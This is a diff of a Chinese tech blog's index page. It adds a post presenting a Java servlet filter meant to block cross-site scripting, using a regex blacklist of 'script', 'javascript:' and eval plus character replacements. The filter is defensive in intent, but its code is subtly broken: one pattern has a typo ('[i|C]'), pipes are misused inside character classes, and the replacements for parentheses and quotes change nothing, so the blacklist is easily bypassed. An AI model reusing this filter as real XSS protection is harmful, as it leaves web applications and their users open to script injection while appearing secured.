@@ -467,6 +467,224 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/filter-xss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="上善若水">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水の技术簿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/03/24/hack/filter-xss/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/19/index.html">Filter安全过滤高级最终行（XSS攻击）</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-03 13:45:12" itemprop="dateModified" datetime="2019-09-03T13:45:12+08:00">2019-09-03</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/hack/" itemprop="url" rel="index"><span itemprop="name">hack</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">package com.what21.filter.xss;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.LinkedHashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import javax.servlet.Filter;</span><br><span class="line">import javax.servlet.FilterChain;</span><br><span class="line">import javax.servlet.FilterConfig;</span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.ServletRequest;</span><br><span class="line">import javax.servlet.ServletResponse;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line">public class XSSFilter implements Filter &#123;</span><br><span class="line"></span><br><span class="line">    // XSS处理Map</span><br><span class="line">    private static Map&lt;String,String&gt; xssMap = new LinkedHashMap&lt;String,String&gt;();</span><br><span class="line"></span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        // 含有脚本： script</span><br><span class="line">        xssMap.put(&quot;[s|S][c|C][r|R][i|C][p|P][t|T]&quot;, &quot;&quot;);</span><br><span class="line">        // 含有脚本 javascript</span><br><span class="line">        xssMap.put(&quot;[\\\&quot;\\\&apos;][\\s]*[j|J][a|A][v|V][a|A][s|S][c|C][r|R][i|I][p|P][t|T]:(.*)[\\\&quot;\\\&apos;]&quot;, &quot;\&quot;\&quot;&quot;);</span><br><span class="line">        // 含有函数： eval</span><br><span class="line">        xssMap.put(&quot;[e|E][v|V][a|A][l|L]\\((.*)\\)&quot;, &quot;&quot;);</span><br><span class="line">        // 含有符号 &lt;</span><br><span class="line">        xssMap.put(&quot;&lt;&quot;, &quot;&amp;lt;&quot;);</span><br><span class="line">        // 含有符号 &gt;</span><br><span class="line">        xssMap.put(&quot;&gt;&quot;, &quot;&amp;gt;&quot;);</span><br><span class="line">        // 含有符号 (</span><br><span class="line">        xssMap.put(&quot;\\(&quot;, &quot;(&quot;);</span><br><span class="line">        // 含有符号 )</span><br><span class="line">        xssMap.put(&quot;\\)&quot;, &quot;)&quot;);</span><br><span class="line">        // 含有符号 &apos;</span><br><span class="line">        xssMap.put(&quot;&apos;&quot;, &quot;&apos;&quot;);</span><br><span class="line">        // 含有符号 &quot;</span><br><span class="line">        xssMap.put(&quot;\&quot;&quot;, &quot;\&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response,</span><br><span class="line">            FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">        // 强制类型转换 HttpServletRequest</span><br><span class="line">        HttpServletRequest httpReq = (HttpServletRequest)request;</span><br><span class="line">        // 构造HttpRequestWrapper对象处理XSS</span><br><span class="line">        HttpRequestWrapper httpReqWarp = new HttpRequestWrapper(httpReq,xssMap);</span><br><span class="line">        //</span><br><span class="line">        chain.doFilter(httpReqWarp, response);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void destroy() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>{———-}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">=============================</span><br><span class="line">package com.what21.filter.xss;</span><br><span class="line"></span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.Set;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"></span><br><span class="line">public final class HttpRequestWrapper extends HttpServletRequestWrapper &#123;</span><br><span class="line"></span><br><span class="line">    private Map&lt;String, String&gt; xssMap;</span><br><span class="line"></span><br><span class="line">    public HttpRequestWrapper(HttpServletRequest request) &#123;</span><br><span class="line">        super(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public HttpRequestWrapper(HttpServletRequest request,</span><br><span class="line">            Map&lt;String, String&gt; xssMap) &#123;</span><br><span class="line">        super(request);</span><br><span class="line">        this.xssMap = xssMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String[] getParameterValues(String parameter) &#123;</span><br><span class="line">        String[] values = super.getParameterValues(parameter);</span><br><span class="line">        if (values == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        int count = values.length;</span><br><span class="line">        // 遍历每一个参数，检查是否含有</span><br><span class="line">        String[] encodedValues = new String[count];</span><br><span class="line">        for (int i = 0; i &lt; count; i++) &#123;</span><br><span class="line">            encodedValues[i] = cleanXSS(values[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        return encodedValues;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String getParameter(String parameter) &#123;</span><br><span class="line">        String value = super.getParameter(parameter);</span><br><span class="line">        if (value == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        return cleanXSS(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getHeader(String name) &#123;</span><br><span class="line">        String value = super.getHeader(name);</span><br><span class="line">        if (value == null)</span><br><span class="line">            return null;</span><br><span class="line">        return cleanXSS(value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">     * 清除恶意的XSS脚本</span><br><span class="line">     *</span><br><span class="line">     * @param value</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    private String cleanXSS(String value) &#123;</span><br><span class="line">        Set&lt;String&gt; keySet = xssMap.keySet();</span><br><span class="line">        for(String key : keySet)&#123;</span><br><span class="line">            String v = xssMap.get(key);</span><br><span class="line">            value = value.replaceAll(key,v);</span><br><span class="line">        &#125;</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">=============================================================================</span><br><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;XSSFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.what21.filter.xss.XSSFilter&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;XSSFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    
+      
+
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/art-infiltration/" rel="bookmark">渗透的艺术</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/ssh-violence/" rel="bookmark">ssh远程登陆破解</a></div>
+      
+    </li>
+  
+    <li class="popular-posts-item">
+      
+      
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/metasploit-hack-windows/" rel="bookmark">使用Metasploit入侵windows</a></div>
+      
+    </li>
+  
+  </ul>
+
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/hack/metasploit-hack-windows/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -600,13 +818,6 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
       <div class="popular-posts-title"><a href="/2018/03/24/hack/dos/" rel="bookmark">DOS攻击工具</a></div>
       
     </li>
@@ -614,7 +825,7 @@
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2018/03/24/hack/filter-xss/" rel="bookmark">Filter安全过滤高级最终行（XSS攻击）</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/about-hack/" rel="bookmark">关于漏洞和攻击</a></div>
       
     </li>
   
@@ -632,227 +843,10 @@
       
     </li>
   
-  </ul>
-
-
-    
-
-    
-    
-    
-
-    
-
-    
-       
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/jdk/jdk-annotation/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="上善若水">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水の技术簿">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2018/03/24/jdk/jdk-annotation/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/19/index.html">自定义注解</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-03-24 08:00:00" itemprop="dateCreated datePublished" datetime="2018-03-24T08:00:00+08:00">2018-03-24</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-09-03 13:45:11" itemprop="dateModified" datetime="2019-09-03T13:45:11+08:00">2019-09-03</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a></span>
-
-                
-                
-                  ，
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/java/jdk/" itemprop="url" rel="index"><span itemprop="name">jdk</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * @author 无心</span><br><span class="line"> * @date 2018-05-08 10:10:10</span><br><span class="line"> * 文档id</span><br><span class="line"> */</span><br><span class="line">@Inherited</span><br><span class="line">@Documented</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(ElementType.FIELD)</span><br><span class="line">public @interface DocId &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@Documented</span><br><span class="line">@Inherited</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="line">public @interface Document &#123;</span><br><span class="line">    //必须为小写</span><br><span class="line">    String index();</span><br><span class="line"></span><br><span class="line">    //分片数量</span><br><span class="line">    int shards() default 5;</span><br><span class="line"></span><br><span class="line">    //副本数</span><br><span class="line">    int replicas() default 1;</span><br><span class="line"></span><br><span class="line">    //数据刷新</span><br><span class="line">    String refreshInterval() default &quot;1s&quot;;</span><br><span class="line"></span><br><span class="line">    //存储类型</span><br><span class="line">    String indexStoreType() default &quot;fs&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>{———-}</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author 无心</span><br><span class="line"> * @date 2018-05-08 10:10:10</span><br><span class="line"> * 注解获取封装</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class FieldUtil &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static void main(String [] args) throws IllegalAccessException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        MedCheckDoc medCheckDoc = new MedCheckDoc();</span><br><span class="line"></span><br><span class="line">        String string = getDocType(medCheckDoc.getClass());</span><br><span class="line">        System.err.print(string);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocIndex(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.index();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static int getDocShards(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.shards();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static int getDocReplicas(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.replicas();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocRefreshInterval(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.refreshInterval();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取Document注解中的值</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocIndexStoreType(Class clazz)&#123;</span><br><span class="line">        Document document = (Document) clazz.getAnnotation(Document.class);</span><br><span class="line">        return document.indexStoreType();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取DocId被注解字段</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocId(Class clazz) throws NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        List&lt;Field&gt; result = new ArrayList&lt;Field&gt;();</span><br><span class="line">        for (Field field:fields)&#123;</span><br><span class="line">            if(field.getAnnotation(DocId.class)!=null)&#123;</span><br><span class="line">                result.add(field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(result.size()!=1)&#123;</span><br><span class="line">            throw new NoSuchFieldException(&quot;未找到注解&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return result.get(0).getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取DocType被注解字段</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static String getDocType(Class clazz) throws NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        List&lt;Field&gt; result = new ArrayList&lt;Field&gt;();</span><br><span class="line">        for (Field field:fields)&#123;</span><br><span class="line">            if(field.getAnnotation(DocType.class)!=null)&#123;</span><br><span class="line">                result.add(field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(result.size()!=1)&#123;</span><br><span class="line">            throw new NoSuchFieldException(&quot;未找到注解&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return result.get(0).getName();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 获取DocSearchKeyWord被注解字段</span><br><span class="line">     * @param clazz</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public static List&lt;String&gt; getDocKeyword(Class clazz) throws NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field[] fields = clazz.getDeclaredFields();</span><br><span class="line">        List&lt;String&gt; list = new ArrayList&lt;&gt;();</span><br><span class="line">        for (Field field:fields)&#123;</span><br><span class="line">            if(field.getAnnotation(DocSearchKeyWord.class)!=null)&#123;</span><br><span class="line">                list.add(field.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if(list.size() ==0)&#123;</span><br><span class="line">            throw new NoSuchFieldException(&quot;未找到注解&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        return list;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    
-      
-
-  <div class="popular-posts-header">相关文章</div>
-  <ul class="popular-posts">
-  
     <li class="popular-posts-item">
       
       
-      <div class="popular-posts-title"><a href="/2019/05/26/jdk/jdk-model/" rel="bookmark">jdk内存模型</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2019/03/16/jdk/jdk-tree-2/" rel="bookmark">二叉树的深度遍历与广度遍历</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/12/11/jdk/jdk-nio/" rel="bookmark">Java NIO浅析【转】</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/11/01/jdk/jdk-tree/" rel="bookmark">java 红黑树</a></div>
-      
-    </li>
-  
-    <li class="popular-posts-item">
-      
-      
-      <div class="popular-posts-title"><a href="/2018/03/24/jdk/jdk-list/" rel="bookmark">列表List</a></div>
+      <div class="popular-posts-title"><a href="/2018/03/24/hack/filter-xss/" rel="bookmark">Filter安全过滤高级最终行（XSS攻击）</a></div>
       
     </li>
   
@@ -1159,6 +1153,447 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.wuxinvip.com/2018/03/24/jdk/jdk-annotation/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="上善若水">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水の技术簿">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2018/03/24/jdk/jdk-annotation/" class="post-title-link" itemprop="https://www.wuxinvip.com/page/19/index.html">自定义注解</a>
+              
+            
+          </h2>
